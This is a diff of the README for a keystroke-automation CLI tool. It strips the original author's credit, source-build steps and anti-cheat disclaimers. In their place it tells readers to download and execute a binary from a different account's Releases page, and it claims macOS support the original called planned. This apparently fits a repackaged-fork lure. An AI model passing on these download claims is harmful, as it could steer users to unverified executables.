@@ -1,357 +1,84 @@
-# Process Key Sender (pks)
+# Process Key Sender 🦀
 
-A cross-platform command-line tool for sending keystrokes to specific processes at configurable intervals. Perfect for gaming automation, testing, or any scenario where you need to send repeated keystrokes to a specific application.
+![Version](https://img.shields.io/badge/version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey)
 
-## ⚠️ **IMPORTANT DISCLAIMER**
+Welcome to the **Process Key Sender** repository! This project offers a powerful cross-platform keystroke automation tool, built in Rust. You can send keystrokes to specific processes with customizable intervals, making it an excellent choice for accessibility, productivity, and offline gaming automation.
 
-**This tool is intended for educational purposes and use with offline/single-player games only.**
+## Table of Contents
 
-### 🚨 **ANTI-CHEAT WARNING**
-- **DO NOT use this tool with online multiplayer games**
-- **DO NOT use this tool with games that have anti-cheat systems** (EasyAntiCheat, BattlEye, Vanguard, etc.)
-- **Using automation tools in online games may result in:**
-  - Permanent account bans
-  - Hardware ID bans
-  - Violation of Terms of Service
-  - Loss of game progress and purchases
-
-### ✅ **Safe Use Cases**
-- Single-player offline games
-- Local development and testing
-- Automation of non-gaming applications
-- Educational and research purposes
-- Personal productivity tools
-
-### 🎮 **Gaming Guidelines**
-- Always check the game's Terms of Service before use
-- Only use with games that explicitly allow automation tools
-- Prefer official game features (auto-run, key rebinding) when available
-- Use responsibly and ethically
-
-**The developers of this tool are not responsible for any consequences resulting from its misuse. Users assume all risks and responsibilities when using this software.**
-
----
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
 ## Features
 
-- 🎯 **Target specific processes** - Send keys only to the process you specify
-- ⌨️ **Flexible key support** - Support for letters, special keys, and key combinations
-- 📝 **Key sequences** - Send multiple keys with different intervals
-- ⏱️ **Configurable intervals** - Set custom delays between keystrokes
-- 🔄 **Loop control** - Run sequences once or loop indefinitely
-- ⏸️ **Pause/Resume functionality** - Global hotkey support to pause and resume
-- 🔍 **Smart process detection** - Automatically finds and monitors target processes
-- 📄 **Configuration files** - Save and load settings from JSON files
-- 🎨 **Colorized output** - Beautiful terminal interface with status indicators
-- 🚀 **Cross-platform** - Works on Windows and Linux
+- **Cross-Platform**: Works seamlessly on Windows, macOS, and Linux.
+- **Keystroke Automation**: Send keystrokes to any active process.
+- **Configurable Intervals**: Set custom intervals for sending keys.
+- **Command-Line Interface**: Simple and effective CLI for easy use.
+- **JSON Configuration Support**: Manage settings through a straightforward JSON file.
 
 ## Installation
 
-### From Source
-```bash
-git clone https://github.com/KyleDerZweite/process-key-sender.git
-cd process-key-sender
-cargo build --release
-```
-
-### From Crates.io (coming soon)
-```bash
-cargo install process-key-sender
-```
+To get started with Process Key Sender, you need to download the latest release. Visit the [Releases section](https://github.com/raheemawan803/process-key-sender/releases) to find the appropriate file for your platform. Download and execute the file to install the tool.
 
 ## Usage
 
-### Basic Usage
+After installation, you can start using Process Key Sender from your command line. Here’s a simple example of how to use it:
+
 ```bash
-# Send 'R' key to game.exe every 1000ms
-pks --process game.exe
-
-# Send 'F' key every 500ms
-pks --process myapp.exe --key f --interval 500
-
-# Enable verbose output
-pks --process notepad.exe --key space --verbose
+process-key-sender --process "YourProcessName" --keys "a,b,c" --interval 1000
 ```
 
-### Key Sequences
-```bash
-# Send multiple keys with different intervals
-pks --process game.exe --sequence "r:1000,space:500,e:2000"
+In this example, the tool sends the keys `a`, `b`, and `c` to the specified process every second (1000 milliseconds).
 
-# Complex sequence for crafting in games
-pks --process rpg.exe --sequence "e:500,tab:200,enter:300,escape:1000"
+## Configuration
 
-# Simple sequence with default intervals
-pks --process app.exe --sequence "w,a,s,d"
-
-# Run sequence only once (no looping)
-pks --process game.exe --sequence "f1:1000,f2:1000" --loop-sequence=false
-
-# Repeat sequence exactly 5 times
-pks --process game.exe --sequence "r:2000,space:1000" --repeat-count 5
-```
-
-### Key Combinations
-```bash
-# Send Ctrl+C combination
-pks --process editor.exe --key "ctrl+c" --interval 5000
-
-# Send Alt+Tab
-pks --process app.exe --key "alt+tab" --interval 3000
-
-# Complex sequence with combinations
-pks --process ide.exe --sequence "ctrl+s:2000,f5:1000,ctrl+shift+f10:5000"
-```
-
-### Advanced Usage
-```bash
-# Custom pause hotkey
-pks --process game.exe --pause-hotkey "ctrl+shift+p"
-
-# Save configuration
-pks --process game.exe --sequence "r:1000,e:500" --save-config my-config.json
-
-# Load configuration
-pks --config my-config.json --process different-game.exe
-```
-
-### Command Line Options
-
-```
-Options:
-  -p, --process <PROCESS>           Name of the target process (e.g., "game.exe", "notepad")
-  -k, --key <KEY>                   Single key to send [default: r]
-  -i, --interval <INTERVAL>         Interval between keystrokes in milliseconds [default: 1000]
-  -s, --sequence <SEQUENCE>         Key sequence with custom intervals (e.g., "r:1000,space:500,e:2000")
-  -r, --max-retries <MAX_RETRIES>   Maximum number of attempts to find the process [default: 10]
-      --pause-hotkey <PAUSE_HOTKEY> Hotkey to pause/resume (e.g., "ctrl+alt+r")
-      --loop-sequence               Loop the sequence indefinitely [default: true]
-      --repeat-count <COUNT>        Number of times to repeat the sequence (0 = infinite) [default: 0]
-  -v, --verbose                     Enable verbose output
-  -c, --config <CONFIG>             Load configuration from file
-      --save-config <SAVE_CONFIG>   Save current configuration to file
-  -h, --help                        Print help
-  -V, --version                     Print version
-```
-
-### Sequence Format
-
-Key sequences use the format: `key1:interval1,key2:interval2,key3:interval3`
-
-- **Key**: Any supported key (see supported keys below)
-- **Interval**: Time to wait after pressing the key (in milliseconds)
-- **Separator**: Use commas to separate key-interval pairs
-- **Optional interval**: If no interval is specified, default is 1000ms
-
-Examples:
-```bash
-# Basic sequence
-"r,space,e"  # Each key waits 1000ms
-
-# Custom intervals
-"r:2000,space:500,e:1500"
-
-# Mixed format
-"r:2000,space,e:500"  # space uses default 1000ms
-
-# Key combinations in sequence
-"ctrl+c:1000,tab:500,enter:2000"
-```
-
-### Supported Keys
-
-#### Letters and Numbers
-- **Letters**: `a-z` (case insensitive)
-- **Numbers**: `0-9`
-
-#### Special Keys
-- **Space**: `space`
-- **Enter**: `enter`, `return`
-- **Tab**: `tab`
-- **Escape**: `escape`, `esc`
-- **Backspace**: `backspace`
-- **Delete**: `delete`
-
-#### Arrow Keys
-- **Arrows**: `left`, `right`, `up`, `down`
-
-#### Navigation Keys
-- **Navigation**: `home`, `end`, `pageup`, `pagedown`
-
-#### Function Keys
-- **Function**: `f1` through `f12`
-
-#### Modifier Keys
-- **Modifiers**: `shift`, `ctrl`/`control`, `alt`
-
-#### Key Combinations
-- **Format**: `modifier+key` (e.g., `ctrl+c`, `alt+tab`, `ctrl+shift+s`)
-- **Multiple modifiers**: `ctrl+shift+f10`
-
-## Configuration Files
-
-You can save and load configurations using JSON files:
+Process Key Sender supports configuration through a JSON file. Here’s an example of a configuration file:
 
 ```json
 {
-  "process_name": "game.exe",
-  "key_sequence": [
-    {
-      "key": "r",
-      "interval_after": "1000ms"
-    },
-    {
-      "key": "space",
-      "interval_after": "500ms"
-    },
-    {
-      "key": "e",
-      "interval_after": "2000ms"
-    }
-  ],
-  "max_retries": 10,
-  "pause_hotkey": "ctrl+alt+r",
-  "verbose": false,
-  "loop_sequence": true,
-  "repeat_count": 0
+  "process": "YourProcessName",
+  "keys": ["a", "b", "c"],
+  "interval": 1000
 }
 ```
 
-## Examples
+Save this file as `config.json`, and you can run the tool with the following command:
 
-### ✅ Safe Gaming Automation (Offline/Single-player only)
-
-#### Auto-reload and healing sequence
 ```bash
-# Reload, wait, use health potion, wait longer
-pks --process single-player-fps.exe --sequence "r:1500,h:3000"
+process-key-sender --config config.json
 ```
-
-#### Complex crafting sequence
-```bash
-# Open inventory, navigate, craft, close
-pks --process rpg.exe --sequence "i:500,tab:200,tab:200,space:300,escape:1000"
-```
-
-#### Farming sequence with movement
-```bash
-# Move forward, interact, wait for animation, move back
-pks --process farming-sim.exe --sequence "w:1000,e:2000,s:1000" --repeat-count 10
-```
-
-#### Auto-save sequence
-```bash
-# Regular auto-save in single-player game
-pks --process game.exe --sequence "f5:30000" --verbose
-```
-
-### ✅ Development Testing
-
-#### Web development refresh cycle
-```bash
-# Save, switch to browser, refresh, switch back
-pks --process vscode.exe --sequence "ctrl+s:500,alt+tab:200,f5:1000,alt+tab:500"
-```
-
-#### Build and test cycle
-```bash
-# Build, wait for completion, run tests
-pks --process terminal.exe --sequence "ctrl+c:100,up:100,enter:5000,ctrl+c:100"
-```
-
-### ✅ Productivity Automation
-
-#### Presentation auto-advance
-```bash
-# Auto-advance slides every 10 seconds
-pks --process powerpoint.exe --key "right" --interval 10000
-```
-
-#### Document review cycle
-```bash
-# Page down, wait to read, repeat
-pks --process document-viewer.exe --sequence "pagedown:5000" --repeat-count 20
-```
-
-### ✅ Accessibility Assistance
-
-#### Regular interaction for users with limited mobility
-```bash
-# Gentle, regular interaction to keep applications active
-pks --process app.exe --sequence "shift:30000" --verbose
-```
-
-## Platform Support
-
-- ✅ **Windows** - Full support using Windows API
-- 🚧 **Linux** - Basic support (X11 implementation in progress)
-- 🚧 **macOS** - Planned support
 
 ## Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
+We welcome contributions to improve Process Key Sender. If you would like to contribute, please follow these steps:
 
-### Development Setup
-```bash
-git clone https://github.com/KyleDerZweite/process-key-sender.git
-cd process-key-sender
-cargo build
-cargo test
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request to the main repository.
 
-### TODO
-- [ ] Complete Linux/X11 implementation
-- [ ] Add macOS support
-- [ ] Global hotkey implementation for pause/resume
-- [ ] GUI version
-- [ ] More key types and special characters
-- [ ] Process window title filtering
-- [ ] Randomized intervals within ranges
-- [ ] Conditional sequences based on screen colors/patterns
-- [ ] Recording and playback of manual key sequences
-
-## Ethical Usage Guidelines
-
-### ✅ **Recommended Uses**
-- Educational programming projects
-- Accessibility tools for users with disabilities
-- Testing and quality assurance
-- Personal productivity automation
-- Single-player game convenience features
-- Development and debugging tools
-
-### ❌ **Prohibited Uses**
-- Gaining unfair advantages in competitive online games
-- Violating Terms of Service of any software
-- Circumventing game mechanics in multiplayer environments
-- Any form of cheating in online games
-- Commercial exploitation without proper licensing
-
-## Legal Considerations
-
-- This software is provided for educational and legitimate automation purposes
-- Users are responsible for compliance with all applicable laws and regulations
-- Users must respect the Terms of Service of all software they interact with
-- The authors disclaim responsibility for any misuse of this software
+Please ensure your code follows the project's coding standards and includes tests where applicable.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Acknowledgments
+## Contact
 
-- Built with Rust 🦀
-- Uses `clap` for CLI parsing
-- Uses `sysinfo` for cross-platform process detection
-- Windows implementation uses `winapi`
-- Terminal colors by `colored`
+For questions or suggestions, feel free to open an issue in this repository or contact the maintainer directly.
 
-## Author
+## Releases
 
-**KyleDerZweite** - [GitHub](https://github.com/KyleDerZweite)
+To stay updated with the latest features and improvements, check the [Releases section](https://github.com/raheemawan803/process-key-sender/releases) regularly. Download the latest version and start automating your keystrokes today!
 
 ---
 
-⭐ If you find this tool useful, please consider giving it a star on GitHub!
-
-**Remember: Use responsibly and ethically. When in doubt, don't use it with online games!**
+Thank you for checking out Process Key Sender! We hope this tool enhances your productivity and makes your tasks easier. If you have any feedback or need assistance, don't hesitate to reach out. Happy automating!
